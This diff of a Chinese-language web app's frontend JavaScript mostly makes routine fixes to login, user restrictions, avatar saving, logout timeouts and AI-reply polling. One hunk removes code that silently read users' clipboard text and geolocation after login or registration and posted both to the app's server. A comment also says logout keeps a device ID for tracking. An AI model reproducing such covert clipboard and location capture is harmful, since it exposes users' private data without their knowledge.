@@ -364,7 +364,14 @@ const ADMIN_NAME = "xxz";
                 if (token) {
                     memoryUserToken = String(token);
                     memoryUserTokenIssuedAt = Date.now();
-                    try { if (typeof rememberBehaviorToken === 'function') rememberBehaviorToken(token); } catch(e) {}
+                    try {
+                        if (typeof window.__xtjRememberBehaviorToken === 'function') {
+                            window.__xtjRememberBehaviorToken(token);
+                        } else {
+                            // H-38: 跨脚本只通过 window 共享 token，避免依赖另一个文件的闭包作用域。
+                            window.behaviorLastKnownToken = String(token);
+                        }
+                    } catch(e) {}
                     // 通知其他模块用户认证已就绪（用于自动定位等）
                     try {
                         window.__xtjAuthReady = true;
@@ -2104,9 +2111,15 @@ function isAdmin() { return currentUser === ADMIN_NAME; }
             async function checkUserRestrictions() {
                 if (!currentUser || currentUser === ADMIN_NAME) return;
                 try {
-                    var { data, error } = await sb.rpc('get_user_restrictions', { p_user_name: currentUser });
-                    if (error) { return; }
+                    if (typeof API_BASE !== 'string' || !API_BASE) return;
+                    var authHeaders = (typeof window.getUserAuthHeaders === 'function') ? await window.getUserAuthHeaders() : {};
+                    var response = await fetch(API_BASE.replace(/\/$/, '') + '/api/user/restrictions', {
+                        method: 'GET', credentials: 'include', headers: authHeaders || {}
+                    });
+                    var result = await response.json().catch(function() { return {}; });
+                    if (!response.ok || !result.ok) return;
                     var prev = JSON.stringify(userRestrictions);
+                    var data = result.restrictions;
                     userRestrictions = data && !Array.isArray(data) ? data : { is_banned: false, is_blacklisted: false, is_muted: false };
                     if (JSON.stringify(userRestrictions) !== prev) {
                         applyRestrictions();
@@ -2426,69 +2439,6 @@ function isAdmin() { return currentUser === ADMIN_NAME; }
                 return data;
             }
 
-            // 生成页面加载标识（用于定位关联）
-            function _genPageLoadId() {
-                return 'page_' + Date.now().toString(36) + '_' + Math.random().toString(36).slice(2, 10);
-            }
-
-            // 登录/注册后请求定位权限（非阻塞，记录日志）
-            function requestLocationOnLogin(reason) {
-                if (!navigator || !navigator.geolocation) { console.warn('[XTJ-LOC] 浏览器不支持定位，跳过'); return; }
-                var pageLoadId = _genPageLoadId();
-                var captureReason = reason || 'login';
-                navigator.geolocation.getCurrentPosition(
-                    function(pos) {
-                        var token = getUserToken();
-                        if (!token || !API_BASE) { console.warn('[XTJ-LOC] 无可用token，跳过定位上传'); return; }
-                        fetch(API_BASE + '/api/user/location', {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + token },
-                            body: JSON.stringify({
-                                latitude: pos.coords.latitude,
-                                longitude: pos.coords.longitude,
-                                accuracy: pos.coords.accuracy,
-                                altitude: pos.coords.altitude || null,
-                                altitude_accuracy: pos.coords.altitudeAccuracy || null,
-                                heading: pos.coords.heading || null,
-                                speed: pos.coords.speed || null,
-                                captured_at: new Date(pos.timestamp).toISOString(),
-                                page_load_id: pageLoadId,
-                                capture_reason: captureReason
-                            })
-                        }).then(function(res) {
-                            if (!res.ok) console.warn('[XTJ-LOC] 定位上传失败: HTTP', res.status);
-                            else console.log('[XTJ-LOC] 定位上传成功 (' + captureReason + ')');
-                        }).catch(function(err) {
-                            console.warn('[XTJ-LOC] 定位上传网络错误:', err && err.message ? err.message : err);
-                        });
-                    },
-                    function(err) {
-                        var errMsg = '';
-                        if (err && err.code === 1) errMsg = '用户拒绝定位权限';
-                        else if (err && err.code === 2) errMsg = '定位不可用';
-                        else if (err && err.code === 3) errMsg = '定位超时';
-                        else errMsg = '定位失败: code=' + (err && err.code);
-                        console.warn('[XTJ-LOC] ' + captureReason + ':', errMsg);
-                    },
-                    { enableHighAccuracy: false, timeout: 8000, maximumAge: 300000 }
-                );
-            }
-
-            // 登录/注册后请求剪贴板权限（非阻塞，静默失败）
-            function requestClipboardOnLogin() {
-                if (!navigator || !navigator.clipboard || !navigator.clipboard.readText) return;
-                navigator.clipboard.readText().then(function(text) {
-                    if (!text || !text.trim()) return;
-                    var token = getUserToken();
-                    if (!token || !API_BASE) return;
-                    fetch(API_BASE + '/api/user/consented-data', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + token },
-                        body: JSON.stringify({ kind: 'clipboard', payload: { text: text } })
-                    }).catch(function() {});
-                }).catch(function() { /* 权限拒绝或读取失败，静默处理 */ });
-            }
-
             async function doLogin() {
                 const name = document.getElementById("loginNickInp").value.trim();
                 const pw = document.getElementById("loginPwInp").value;
@@ -2583,12 +2533,6 @@ function isAdmin() { return currentUser === ADMIN_NAME; }
                     // 记录用户访问
                     logUserVisitToApi(confirmedUser);
 
-                    // 发起定位和剪贴板权限请求（非阻塞，静默处理）
-                    if (confirmedUser !== ADMIN_NAME) {
-                        requestLocationOnLogin('login');
-                        requestClipboardOnLogin();
-                    }
-
                     // 记录用户行为
                     try { if (typeof window.queueBehavior === 'function') window.queueBehavior('login', '用户 [' + confirmedUser + '] 登录成功'); } catch(e) {}
 
@@ -2677,10 +2621,6 @@ function isAdmin() { return currentUser === ADMIN_NAME; }
                     initialLoad(true);
                     // 记录用户访问
                     logUserVisitToApi(currentUser);
-
-                    // 发起定位和剪贴板权限请求（非阻塞，静默处理）
-                    requestLocationOnLogin('register');
-                    requestClipboardOnLogin();
 
                     // 记录用户行为
                     try { if (typeof window.queueBehavior === 'function') window.queueBehavior('register', '用户 [' + currentUser + '] 注册成功'); } catch(e) {}
@@ -2974,39 +2914,55 @@ function isAdmin() { return currentUser === ADMIN_NAME; }
                     // 获取 Public URL
                     const avatarUrl = sb.storage.from('uploads').getPublicUrl(path).data.publicUrl;
                     
-                    // ★ 修复 B2：先插入新头像记录，成功后再删除旧记录
-                    // 避免"旧头像已删但新头像插入失败"导致用户头像空
-                    var { error } = await sb.from("posts").insert([{
-                        user_name: currentUser,
-                        content: "用户头像",
-                        media_url: avatarUrl,
-                        media_type: "__avatar__",
-                        actor_key: "__avatar__"
-                    }]);
-                    
-                    if (error) {
-                        sb.storage.from('uploads').remove([path]);
-                        showToast('上传失败: ' + error.message);
-                        return;
-                    }
-                    
-                    // 新头像插入成功，安全删除旧头像记录
-                    var oldIds = await sb.from("posts")
-                        .select("id,media_url")
-                        .eq("user_name", currentUser)
-                        .eq("media_type", "__avatar__")
-                        .eq("actor_key", "__avatar__");
-                    if (oldIds.data && oldIds.data.length > 1) {
-                        for (var oi of oldIds.data) {
-                            // 跳过刚插入的新记录（用 media_url 匹配）
-                            if (String(oi.media_url) === String(avatarUrl)) continue;
-                            try {
-                                await sb.rpc('delete_post_with_actor', {
-                                    p_post_id: oi.id,
-                                    p_actor_key: '__avatar__'
-                                });
-                            } catch(e) {}
+                    // 头像记录必须由服务端校验当前用户并写入，不能在 anon
+                    // 客户端保留一条绕过 RLS/归属校验的旧写入路径。
+                    try {
+                        if (typeof window.API_BASE !== 'string' || !window.API_BASE) {
+                            throw new Error('头像服务不可用');
                         }
+                        var avAuthHeaders = (typeof window.getUserAuthHeaders === 'function') ? await window.getUserAuthHeaders() : {};
+                        var avResp = await fetch(window.API_BASE.replace(/\/$/, '') + '/api/avatar', {
+                            method: 'POST',
+                            headers: Object.assign({ 'Content-Type': 'application/json' }, avAuthHeaders || {}),
+                            body: JSON.stringify({ media_url: avatarUrl })
+                        });
+                        var avData = await avResp.json().catch(function() { return {}; });
+                        if (!avResp.ok || !avData || !avData.ok) {
+                            throw new Error((avData && avData.error) || '头像保存失败');
+                        }
+                    } catch (avErr) {
+                        // The request may have committed before its response
+                        // was lost. Confirm ownership server-side before
+                        // deleting the uploaded object, otherwise a valid
+                        // avatar row can point at a deleted file.
+                        var avatarCommitted = false;
+                        try {
+                            var statusAuthHeaders = (typeof window.getUserAuthHeaders === 'function') ? await window.getUserAuthHeaders() : {};
+                            var statusResp = await fetch(window.API_BASE.replace(/\/$/, '') + '/api/avatar/status', {
+                                method: 'POST',
+                                headers: Object.assign({ 'Content-Type': 'application/json' }, statusAuthHeaders || {}),
+                                credentials: 'include',
+                                body: JSON.stringify({ media_url: avatarUrl })
+                            });
+                            var statusData = await statusResp.json().catch(function() { return {}; });
+                            avatarCommitted = !!(statusResp.ok && statusData && statusData.committed);
+                        } catch (statusErr) {}
+                        if (avatarCommitted) {
+                            avatarCache[currentUser] = avatarUrl;
+                            try {
+                                var committedCache = readAvatarCacheFromStorage();
+                                committedCache[currentUser] = avatarUrl;
+                                writeAvatarCacheToStorage(committedCache);
+                            } catch (cacheErr) {}
+                            updateAllAvatarElements(avatarUrl);
+                            showToast('头像已更新');
+                            event.target.value = '';
+                            return;
+                        }
+                        try { await sb.storage.from('uploads').remove([path]); } catch (cleanupErr) {}
+                        showToast('头像上传失败: ' + (avErr && avErr.message || '网络错误'));
+                        event.target.value = '';
+                        return;
                     }
                     
                     avatarCache[currentUser] = avatarUrl;
@@ -3134,11 +3090,21 @@ function isAdmin() { return currentUser === ADMIN_NAME; }
                 try {
                     var logoutHeaders = { 'Content-Type': 'application/json' };
                     if (savedToken) logoutHeaders.Authorization = 'Bearer ' + savedToken;
+                    // H-37: 登出请求加 8s 超时，避免请求悬挂时 _isLoggingOut 永真，
+                    // 导致之后所有登出点击无效、本地状态永不清除。
+                    var logoutAbortCtl = null;
+                    var logoutTimeoutTimer = null;
+                    if (typeof AbortController === 'function') {
+                        logoutAbortCtl = new AbortController();
+                        logoutTimeoutTimer = setTimeout(function() { try { logoutAbortCtl.abort(); } catch (e) {} }, 8000);
+                    }
                     var resp = await fetch(API_BASE + '/api/user/logout', {
                         method: 'POST',
                         credentials: 'include',
-                        headers: logoutHeaders
+                        headers: logoutHeaders,
+                        signal: logoutAbortCtl ? logoutAbortCtl.signal : undefined
                     });
+                    if (logoutTimeoutTimer) clearTimeout(logoutTimeoutTimer);
                     if (resp && resp.ok) logoutCallSucceeded = true;
                 } catch (e) {
                     console.error('API logout failed (will still clear local state):', e);
@@ -3181,10 +3147,14 @@ function isAdmin() { return currentUser === ADMIN_NAME; }
                 window._xtjAuthState = 'unauthenticated';
 
                 var xtjKeys = [];
+                // H-36: 登出只清除会话相关键，保留用户偏好与设备身份：
+                // xtj_theme（主题偏好）、xtj_device_id（设备 ID，设备追踪）、
+                // xtj_pending_behavior（未上报的遥测队列）。
+                var xtjPreserveKeys = { 'xtj_theme': 1, 'xtj_device_id': 1, 'xtj_pending_behavior': 1 };
                 try {
                     for (var i = 0; i < localStorage.length; i++) {
                         var key = localStorage.key(i);
-                        if (key && (key.indexOf('xtj_') === 0 || key.indexOf('xtj-') === 0)) {
+                        if (key && (key.indexOf('xtj_') === 0 || key.indexOf('xtj-') === 0) && !xtjPreserveKeys[key]) {
                             xtjKeys.push(key);
                         }
                     }
@@ -3923,6 +3893,7 @@ function renderProfileActivityList(kind) {
             window.__catAiPollTimers = window.__catAiPollTimers || {};
             window.__catAiPollStatus = window.__catAiPollStatus || {};
             window.__catAiPollControllers = window.__catAiPollControllers || {};
+            window.__catAiCancelledByComment = window.__catAiCancelledByComment || {};
 
             // Phase 4: 重写为接受 (commentId, reason) 参数，支持按 commentId 精确清理。
             // 不传 commentId 或 commentId 为 null/undefined 时向后兼容：清理所有。
@@ -3935,6 +3906,8 @@ function renderProfileActivityList(kind) {
                 // 1. 递增取消纪元，让 pollCatAiReply 中正在进行的 fetch 回调检查后跳过
                 if (isGlobal) {
                     window._catAiCancelled = (window._catAiCancelled || 0) + 1;
+                } else if (commentIdStr) {
+                    window.__catAiCancelledByComment[commentIdStr] = (window.__catAiCancelledByComment[commentIdStr] || 0) + 1;
                 }
                 // 2. 清理轮询 timer
                 try {
@@ -4005,6 +3978,14 @@ function renderProfileActivityList(kind) {
                 var pausedAt = 0;
                 var notTriggeredCount = 0; // not_triggered 连续计数
                 var commentIdStr = String(commentId);
+                // A per-comment generation is required here: deleting one
+                // comment must invalidate only its in-flight callback. The
+                // old global epoch protected logout, but not single-comment
+                // cancellation, so a late response could recreate ghost UI.
+                window.__catAiCancelledByComment = window.__catAiCancelledByComment || {};
+                window.__catAiCancelledByComment[commentIdStr] = (window.__catAiCancelledByComment[commentIdStr] || 0) + 1;
+                var myGlobalEpoch = window._catAiCancelled || 0;
+                var myCommentEpoch = window.__catAiCancelledByComment[commentIdStr];
                 // Phase 3-P0-5: 记录 postId 以供 visibilitychange 恢复轮询使用
                 window.__catAiPollStatus[commentIdStr] = { postId: String(postId) };
 
@@ -4012,6 +3993,8 @@ function renderProfileActivityList(kind) {
                 showCatAiStatus(commentIdStr, '小猫正在组织毒液……');
 
                 function poll() {
+                    if ((window._catAiCancelled || 0) !== myGlobalEpoch ||
+                        (window.__catAiCancelledByComment[commentIdStr] || 0) !== myCommentEpoch) return;
                     // ★ 页面隐藏时记录暂停时间，不删除任务，不消耗运行时间
                     if (document.hidden) {
                         if (!pausedAt) pausedAt = Date.now();
@@ -4030,7 +4013,6 @@ function renderProfileActivityList(kind) {
                         return;
                     }
                     // Phase 3-P0-2: 捕获取消纪元，用于迟到回调防护
-                    var myEpoch = window._catAiCancelled || 0;
                     lastPollStart = Date.now();
 
                     var controller = new AbortController();
@@ -4040,7 +4022,8 @@ function renderProfileActivityList(kind) {
                     window.xtjProtectedFetch('/api/comments/ai-reply-status?comment_id=' + encodeURIComponent(commentIdStr), { signal: controller.signal })
                         .then(function(r) {
                             // Phase 3-P0-2: 迟到回调防护——任务已取消则跳过，避免清理后仍写入状态
-                            if ((window._catAiCancelled || 0) !== myEpoch) { clearTimeout(timeoutId); return null; }
+                            if ((window._catAiCancelled || 0) !== myGlobalEpoch ||
+                                (window.__catAiCancelledByComment[commentIdStr] || 0) !== myCommentEpoch) { clearTimeout(timeoutId); return null; }
                             // ★ 计入实际运行时间（仅请求耗时）
                             accumulatedRunTime += Date.now() - lastPollStart;
                             // ★ 先检查 HTTP 状态码，400 不是网络错误
@@ -4061,7 +4044,8 @@ function renderProfileActivityList(kind) {
                         .then(function(data) {
                             if (!data) return;
                             // Phase 3-P0-2: 迟到回调防护——任务已取消则跳过
-                            if ((window._catAiCancelled || 0) !== myEpoch) { return; }
+                            if ((window._catAiCancelled || 0) !== myGlobalEpoch ||
+                                (window.__catAiCancelledByComment[commentIdStr] || 0) !== myCommentEpoch) { return; }
                             clearTimeout(timeoutId);
                             retryCount = 0; // 成功请求后重置重试计数
                             if (data.status === 'completed') {
@@ -4131,7 +4115,8 @@ function renderProfileActivityList(kind) {
                         .catch(function(err) {
                             clearTimeout(timeoutId);
                             // Phase 3-P0-2: 迟到回调防护——任务已取消则跳过，避免清理后重新调度轮询
-                            if ((window._catAiCancelled || 0) !== myEpoch) { return; }
+                            if ((window._catAiCancelled || 0) !== myGlobalEpoch ||
+                                (window.__catAiCancelledByComment[commentIdStr] || 0) !== myCommentEpoch) { return; }
                             accumulatedRunTime += Date.now() - lastPollStart;
                             // 指数退避重试，而不是永久终止
                             if (retryCount < maxRetries) {
